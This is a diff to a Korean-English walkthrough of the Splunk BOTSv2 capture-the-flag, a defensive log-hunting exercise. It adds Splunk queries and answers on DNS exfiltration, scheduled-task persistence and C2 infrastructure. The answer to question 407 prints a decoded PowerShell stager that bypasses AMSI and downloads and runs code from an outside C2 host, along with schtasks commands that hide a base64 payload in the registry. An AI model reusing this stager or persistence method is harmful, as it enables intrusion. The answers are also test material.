@@ -260,8 +260,51 @@ UDP 추출 데이터가 포함된 하위 도메인의 평균 Shannon 엔트로�
 <details>
   <summary>hint#3</summary>
     If you have never calculated Shannon Entropy, look at the documents for the tool 'URL TOOLBOX' or recent entries in https://www.splunk.com/blog/2017/07/06/hunting-with-splunk-the-basics.html. This will teach you how to calculate Shannon entropy. Also review https://www.splunk.com/pdfs/events/govsummit/hunting_the_known_unknowns_with_DNS.pdf where you can learn how to detect DNS exfiltration<br>
-    Shannon Entropy를 계산한 적이 없다면 https://www.splunk.com/blog/2017/07/06/hunting-with-splunk-the-basics에서 도구 'URL TOOLBOX' 또는 최근 항목에 대한 문서를 살펴보십시오. .html. 이것은 섀넌 엔트로피를 계산하는 방법을 알려줄 것입니다. DNS 유출을 감지하는 방법을 배울 수 있는 https://www.splunk.com/pdfs/events/govsummit/hunting_the_known_unknowns_with_DNS.pdf도 검토하십시오.
+    Shannon Entropy를 계산한 적이 없다면 https://www.splunk.com/blog/2017/07/06/hunting-with-splunk-the-basics에서 도구 'URL TOOLBOX' 또는 최근 항목에 대한 문서를 살펴보십시오. .html. 이것은 섀넌 엔트로피를 계산하는 방법을 알려줄 것입니다. DNS 유출을 감지하는 방법을 배울 수 있는 https://www.splunk.com/pdfs/events/govsummit/hunting_the_known_unknowns_with_DNS.pdf 검토하십시오.
 </details>
+
+ 
+```
+sourcetype=stream:dns dest_port=53 
+| stats count by dest_ip 
+| sort -count
+```
+
+|dest_ip|count|
+|---|---|
+|8.8.8.8|81603|
+|10.0.1.100|44676|
+|172.31.0.2|34004|
+|4.4.4.4|7479|
+|208.109.255.42|444|
+|216.69.185.42|406|
+|192.52.178.30|30|
+|192.175.48.42|26|
+|192.48.79.30|14|
+|193.221.113.53|10|
+|216.239.34.10|10|
+|157.55.133.11|8|
+
+외부망에서 요청한 건은 아래와 같습니다.
+208.109.255.42
+216.69.185.42
+
+```
+index=botsv2 sourcetype=stream:dns (dest_ip=216.69.185.42 OR dest_ip=208.109.255.42) query=* 
+| rex field=query "(?<subdomain>\w+).hildegardsfarm.com"
+| `ut_shannon(subdomain)`
+| stats avg(ut_shannon) by dest_ip
+```
+
+
+|dest_ip|avg(ut_shannon)|
+|---|---|
+|208.109.255.42|3.616738283047444|
+|216.69.185.42|3.633958469641545|
+
+각 값을 두번째자리에서 반올림하면 3.6입니다.
+
+답 : 3.6
 
 407	To maintain persistence in the Frothly network, Taedonggang APT configured several Scheduled Tasks to beacon back to their C2 server. What single webpage is most contacted by these Scheduled Tasks? Answer guidance: Remove the path and type a single value with an extension. Answer example: index.php or images.html  
 Frothly 네트워크의 지속성을 유지하기 위해 Daedonggang APT는 C2 서버에 다시 신호를 보내도록 여러 예약된 작업을 구성했습니다. 이러한 예약된 작업에서 가장 많이 연락하는 단일 웹 페이지는 무엇입니까? 답변 안내: 경로를 제거하고 확장자가 있는 단일 값을 입력합니다. 답변 예: index.php 또는 images.html
@@ -283,6 +326,42 @@ Frothly 네트워크의 지속성을 유지하기 위해 Daedonggang APT는 C2 �
     Once you find the event for scheduled tasks, you will need to pivot to the sourcetype=WinRegistry. In that sourcetype, look for where the scheduled task receives its destination information. You will need to decode it!<br>
     예약된 작업에 대한 이벤트를 찾으면 sourcetype=WinRegistry로 피벗해야 합니다. 해당 소스 유형에서 예약된 작업이 대상 정보를 수신하는 위치를 찾습니다. 디코딩해야 합니다!
 </details>
+
+[schtasks.exe](https://docs.microsoft.com/ko-kr/windows-server/administration/windows-commands/schtasks)는 예약작업을 수행하는 작업스케줄러 명령어입니다. 해당 프로그램을 키워드로 sysmon에서 검색해봅시다.  
+
+```
+sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" schtasks.exe CommandLine=*
+| table  _time host CommandLine
+```
+
+결과 중 network debug관련 이벤트가 보입니다. 예약작업관련 데이터는 winregistry
+
+|_time|host|CommandLine|
+|---|---|---|
+|2017/08/24 03:45:03|	wrk-btun|	"C:\Windows\system32\schtasks.exe"  /Create /F /RU system /SC DAILY /ST 10:26 /TN Updater /TR "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonI -W hidden -c \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKLM:\Software\Microsoft\Network debug).debug)))\""|
+|2017/08/24 04:04:26|	wrk-klagerf|	"C:\Windows\system32\schtasks.exe"  /Create /F /RU system /SC DAILY /ST 10:39 /TN Updater /TR "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonI -W hidden -c \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKLM:\Software\Microsoft\Network debug).debug)))\""|
+|2017/08/24 04:12:36|venus|	"C:\Windows\system32\schtasks.exe"  /Create /F /RU system /SC DAILY /ST 10:51 /TN Updater /TR "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonI -W hidden -c \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKLM:\Software\Microsoft\Network debug).debug)))\""|
+
+```
+sourcetype=WinRegistry \\Software\\Microsoft\\Network
+| stats count by data
+```
+결과가 총 네개 나옵니다. data필드를 base64로 decode하면
+
+```
+[REF].ASSeMBlY.GEtTypE('System.Management.Automation.AmsiUtils')|?{$_}|%{$_.GeTFIeLD('amsiInitFailed','NonPublic,Static').SETVAlUe($nUll,$tRue)};[System.NET.SeRviCEPoIntMANAGEr]::EXPect100ConTiNue=0;$Wc=New-ObJECT SYSTeM.NET.WeBClIent;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$Wc.HeADeRS.ADd('User-Agent',$u);$wc.PRoxY=[SYStem.NET.WEBRequESt]::DEFaUlTWeBPrOxY;$Wc.PrOXy.CRedEntialS = [SYsTEM.NET.CRedeNtiALCachE]::DeFAuLTNEtWorkCreDeNtials;$K=[SYsTem.TeXT.EncODIng]::ASCII.GETBytes('389288edd78e8ea2f54946d3209b16b8');$R={$D,$K=$ArGS;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.COunt])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxOR$S[($S[$I]+$S[$H])%256]}};$wc.HeaDERs.AdD("Cookie","session=wInU2UbWvd/SdOjjVta0BHaZHjI=");$ser='https://45.77.65.211:443';$t='/login/process.php';$DaTA=$WC.DowNloAdDATA($sEr+$T);$iv=$DaTA[0..3];$dAta=$data[4..$datA.lenGTH];-jOiN[ChAr[]](& $R $dATA ($IV+$K))|IEX
+```
+
+이런식으로 나옵니다. 나머지 세개도 base64로 decode해보면
+
+/news.php - 1개
+/admin/get.php - 1개
+/login/process.php - 2개
+가 나옵니다.
+
+그러므로, process.php를 가장 자주 요청합니다.
+
+ 답 : process.php
 
 408	The APT group Taedonggang is always building more infrastructure to attack future victims. Provide the IPV4 IP address of a Taedonggang controlled server that has a completely different first octet to other Taedonggang controlled infrastructure. Answer guidance: 4.4.4.4 has a different first octet than 8.4.4.4  
 APT 그룹 대동강은 미래의 희생자를 공격하기 위해 항상 더 많은 인프라를 구축하고 있습니다. 다른 대동강 제어 인프라와 완전히 다른 첫 번째 옥텟을 갖는 대동강 제어 서버의 IPV4 IP 주소를 제공하십시오. 답변 지침: 4.4.4.4는 8.4.4.4와 첫 번째 옥텟이 다릅니다.
@@ -311,10 +390,22 @@ APT 그룹 대동강은 미래의 희생자를 공격하기 위해 항상 더 �
     힌트#3에서 정보를 얻습니다. 서버를 찾을 때까지 SSL 인증서를 카탈로그화하는 오픈 소스 인텔리전스 웹 사이트에서 다양한 필드를 선택하십시오! OSINT 웹 사이트를 찾는 데 도움이 필요한 경우 https://www.splunk.com/blog/2017/07/21/work-flow-ing-your-osint를 검토하십시오.
 </details>
 
+407번 문제에서 45.77.65.211를 통신하는것을 발견했습니다.
 
+IP관련 정보는 stream:tcp에서 찾아봅시다.
+
+```
+sourcetype=stream:tcp 45.77.65.211
+```
+ssl_cert_hash_256의 값을 찾을 수 있습니다.  
+
+**1ACB3A5AAA46FC13F788A448716F841168F82227**
+해당 값을 [인증서 OSINT 사이트](https://search.censys.io/)에서 검색해봅시다.
+
+답 : 
 
 409	The Taedonggang group had several issues exfiltrating data. Determine how many bytes were successfully transferred in their final, mostly successful attempt to exfiltrate files via a method using TCP, using only the data available in Splunk logs. Use 1024 for byte conversion.  
-대동강 그룹은 데이터를 빼내는 데 몇 가지 문제가 있었습니다. Splunk 로그에서 사용할 수 있는 데이터만 사용하여 TCP를 사용하는 방법을 통해 파일을 추출하려는 대부분의 성공적인 최종 시도에서 성공적으로 전송된 바이트 수를 확인합니다. 바이트 변환에 1024를 사용합니다.
+대동강 그룹은 데이터를 빼내는 데 몇 가지 이슈가 있었습니다. Splunk 로그에서 사용할 수 있는 데이터만 사용하여 TCP를 사용하는 방법을 통해 파일을 추출하려는 대부분의 성공적인 최종 시도에서 성공적으로 전송된 바이트 수를 확인합니다. 바이트 변환에 1024를 사용합니다.
 
 <details>
   <summary>hint#1</summary>
@@ -340,74 +431,4 @@ APT 그룹 대동강은 미래의 희생자를 공격하기 위해 항상 더 �
     구문 분석하는 필드의 정보는 '초당 메가바이트' 및 '초당 킬로바이트'와 같은 값을 갖습니다. 이러한 용어를 염두에 두고 계산을 하십시오.
 </details>
 
-
-
-500	Individual clicks made by a user when interacting with a website are associated with each other using session identifiers. You can find session identifiers in the stream:http sourcetype. The Frothly store website session identifier is found in one of the stream:http fields and does not change throughout the user session. What session identifier is assigned to dberry398@mail.com when visiting the Frothly store for the very first time? Answer guidance: Provide the value of the field, not the field name.
-
-<details>
-  <summary>hint#1</summary>
-
-</details>
-
-501	How many unique user ids are associated with a grand total order of $1000 or more?
-
-<details>
-  <summary>hint#1</summary>
-
-</details>
-
-502	Which user, identified by their email address, edited their profile before placing an order over $1000 in the same clickstream? Answer guidance: Provide the user ID, not other values found from the profile edit, such as name.
-
-<details>
-  <summary>hint#1</summary>
-
-</details>
-
-503	What street address was used most often as the shipping address across multiple accounts, when the billing address does not match the shipping address? Answer example: 123 Sesame St
-
-<details>
-  <summary>hint#1</summary>
-
-</details>
-
-504	What is the domain name used in email addresses by someone creating multiple accounts on the Frothly store website (http://store.froth.ly) that appear to have machine-generated usernames?
-
-<details>
-  <summary>hint#1</summary>
-
-</details>
-
-505	Which user ID experienced the most logins to their account from different IP address and user agent combinations? Answer guidance: The user ID is an email address.
-
-<details>
-  <summary>hint#1</summary>
-
-</details>
-
-506	What is the most popular coupon code being used successfully on the site?
-
-<details>
-  <summary>hint#1</summary>
-
-</details>
-
-507	Several user accounts sharing a common password is usually a precursor to undesirable scenario orchestrated by a fraudster. Which password is being seen most often across users logging into http://store.froth.ly.
-
-<details>
-  <summary>hint#1</summary>
-
-</details>
-
-508	Which HTML page was most clicked by users before landing on http://store.froth.ly/magento2/checkout/ on August 19th? Answer guidance: Use earliest=1503126000 and latest=1503212400 to identify August 19th. Answer example: http://store.froth.ly/magento2/bigbrew.html
-
-<details>
-  <summary>hint#1</summary>
-
-</details>
-
-509	Which HTTP user agent is associated with a fraudster who appears to be gaming the site by unsuccessfully testing multiple coupon codes?
-
-<details>
-  <summary>hint#1</summary>
-
-</details>
+추후 풀이 예정
